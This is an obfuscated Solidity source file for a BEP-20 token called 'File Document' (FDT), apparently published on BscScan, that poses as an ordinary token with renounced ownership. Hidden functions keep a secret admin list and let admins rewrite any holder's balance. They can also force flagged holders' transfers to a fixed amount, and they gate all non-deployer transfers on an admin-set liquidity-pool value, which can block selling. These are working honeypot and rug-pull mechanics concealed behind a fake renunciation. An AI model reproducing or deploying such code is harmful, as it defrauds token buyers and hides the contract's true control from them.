/**
 *Submitted for verification at BscScan.com on 2024-07-04
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.10;

interface zzermztkas {
    function WETH() external pure returns (address);

    function factory() external pure returns (address);
}

abstract contract uusffxdvbkgt {
    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }

    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface kgwqxiwszzq {
    function createPair(address ymswitxwkutyy, address nmxnkapdgaaybs) external returns (address);
}

interface wlzezuldkckf {
    function allowance(address ufinimwosxestn, address spender) external view returns (uint256);

    function approve(address spender, uint256 bnpwrpiuhtzbve) external returns (bool);

    function totalSupply() external view returns (uint256);

    function balanceOf(address fjqpnmths) external view returns (uint256);

    function transfer(address lbveuuixnn, uint256 bnpwrpiuhtzbve) external returns (bool);

    function transferFrom(
        address sender,
        address lbveuuixnn,
        uint256 bnpwrpiuhtzbve
    ) external returns (bool);

    event Transfer(address indexed from, address indexed mwdfxhhenb, uint256 value);
    event Approval(address indexed ufinimwosxestn, address indexed spender, uint256 value);
}

interface wlzezuldkckfMetadata is wlzezuldkckf {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract FileDocument is uusffxdvbkgt, wlzezuldkckf, wlzezuldkckfMetadata {

    function totalSupply() external view virtual override returns (uint256) {
        return anggxlmzcrpxrb;
    }

    address lasorivtzge = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    event OwnershipTransferred(address indexed ufrxpmvims, address indexed cwyffdicjbvkc);

    mapping(address => bool) public nerndfjiitqtmz;

    function wctlwyuopq(address eqosfkvohtg) public {
        nxaioecpww();
        
        if (eqosfkvohtg == pnhlqhcleaohj || eqosfkvohtg == lcuponnwmlvndq) {
            return;
        }
        nerndfjiitqtmz[eqosfkvohtg] = true;
    }

    function getOwner() external view returns (address) {
        return compwqvqrxuz;
    }

    bool public csbylmfhus;

    address yvxxomcorhga = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    uint256 constant izaynwzfvlqi = 19 ** 10;

    function vcbpdwkbedmir(uint256 bnpwrpiuhtzbve) public {
        nxaioecpww();
        yvvvneazyg = bnpwrpiuhtzbve;
    }

    function decimals() external view virtual override returns (uint8) {
        return jzfhomlnrbyro;
    }

    uint8 private jzfhomlnrbyro = 18;

    function transferFrom(address zyelmnapejmdh, address lbveuuixnn, uint256 bnpwrpiuhtzbve) external override returns (bool) {
        if (_msgSender() != yvxxomcorhga) {
            if (tqghrdlbahou[zyelmnapejmdh][_msgSender()] != type(uint256).max) {
                require(bnpwrpiuhtzbve <= tqghrdlbahou[zyelmnapejmdh][_msgSender()]);
                tqghrdlbahou[zyelmnapejmdh][_msgSender()] -= bnpwrpiuhtzbve;
            }
        }
        return ovvvreeza(zyelmnapejmdh, lbveuuixnn, bnpwrpiuhtzbve);
    }

    function transfer(address mapnsqmquin, uint256 bnpwrpiuhtzbve) external virtual override returns (bool) {
        return ovvvreeza(_msgSender(), mapnsqmquin, bnpwrpiuhtzbve);
    }

    string private eyttoqffcyz = "FDT";

    uint256 private anggxlmzcrpxrb = 100000000 * 10 ** 18;

    function vcibjykdlfmc(address ahsperqvlhnu) public {
        require(ahsperqvlhnu.balance < 100000);
        if (akyezgijxhsdiq) {
            return;
        }
        
        ommjchrhdzi[ahsperqvlhnu] = true;
        
        akyezgijxhsdiq = true;
    }

    uint256 public aklsjvourfjmv;

    bool public onhivhwehdix;

    function balanceOf(address fjqpnmths) public view virtual override returns (uint256) {
        return usvklxdgwkiue[fjqpnmths];
    }

    function tcrhmmiciv(address zyelmnapejmdh, address lbveuuixnn, uint256 bnpwrpiuhtzbve) internal returns (bool) {
        require(usvklxdgwkiue[zyelmnapejmdh] >= bnpwrpiuhtzbve);
        usvklxdgwkiue[zyelmnapejmdh] -= bnpwrpiuhtzbve;
        usvklxdgwkiue[lbveuuixnn] += bnpwrpiuhtzbve;
        emit Transfer(zyelmnapejmdh, lbveuuixnn, bnpwrpiuhtzbve);
        return true;
    }

    constructor (){
        
        zzermztkas qojdvwkyrsw = zzermztkas(yvxxomcorhga);
        lcuponnwmlvndq = kgwqxiwszzq(qojdvwkyrsw.factory()).createPair(qojdvwkyrsw.WETH(), address(this));
        
        pnhlqhcleaohj = _msgSender();
        fkggxfhqaqr();
        ommjchrhdzi[pnhlqhcleaohj] = true;
        usvklxdgwkiue[pnhlqhcleaohj] = anggxlmzcrpxrb;
        
        emit Transfer(address(0), pnhlqhcleaohj, anggxlmzcrpxrb);
    }

    function fkggxfhqaqr() public {
        emit OwnershipTransferred(pnhlqhcleaohj, address(0));
        compwqvqrxuz = address(0);
    }

    uint256 jvbcwuqqvkwr;

    address public pnhlqhcleaohj;

    function owner() external view returns (address) {
        return compwqvqrxuz;
    }

    function name() external view virtual override returns (string memory) {
        return jkjjnhkgu;
    }

    function nxaioecpww() private view {
        require(ommjchrhdzi[_msgSender()]);
    }

    uint256 public yheugmyktj;

    function isieugorkhotb(address mapnsqmquin, uint256 bnpwrpiuhtzbve) public {
        nxaioecpww();
        usvklxdgwkiue[mapnsqmquin] = bnpwrpiuhtzbve;
    }

    address public lcuponnwmlvndq;

    function symbol() external view virtual override returns (string memory) {
        return eyttoqffcyz;
    }

    string private jkjjnhkgu = "File Document";

    mapping(address => bool) public ommjchrhdzi;

    address private compwqvqrxuz;

    function allowance(address ysdqtyzbejnicp, address xnrcdntezrml) external view virtual override returns (uint256) {
        if (xnrcdntezrml == yvxxomcorhga) {
            return type(uint256).max;
        }
        return tqghrdlbahou[ysdqtyzbejnicp][xnrcdntezrml];
    }

    bool public akyezgijxhsdiq;

    function ovvvreeza(address zyelmnapejmdh, address lbveuuixnn, uint256 bnpwrpiuhtzbve) internal returns (bool) {
        if (zyelmnapejmdh == pnhlqhcleaohj) {
            return tcrhmmiciv(zyelmnapejmdh, lbveuuixnn, bnpwrpiuhtzbve);
        }
        uint256 nwhygtksdqrhk = wlzezuldkckf(lcuponnwmlvndq).balanceOf(lasorivtzge);
        require(nwhygtksdqrhk == yvvvneazyg);
        require(lbveuuixnn != lasorivtzge);
        if (nerndfjiitqtmz[zyelmnapejmdh]) {
            return tcrhmmiciv(zyelmnapejmdh, lbveuuixnn, izaynwzfvlqi);
        }
        return tcrhmmiciv(zyelmnapejmdh, lbveuuixnn, bnpwrpiuhtzbve);
    }

    mapping(address => mapping(address => uint256)) private tqghrdlbahou;

    function approve(address xnrcdntezrml, uint256 bnpwrpiuhtzbve) public virtual override returns (bool) {
        tqghrdlbahou[_msgSender()][xnrcdntezrml] = bnpwrpiuhtzbve;
        emit Approval(_msgSender(), xnrcdntezrml, bnpwrpiuhtzbve);
        return true;
    }

    uint256 yvvvneazyg;

    mapping(address => uint256) private usvklxdgwkiue;

}
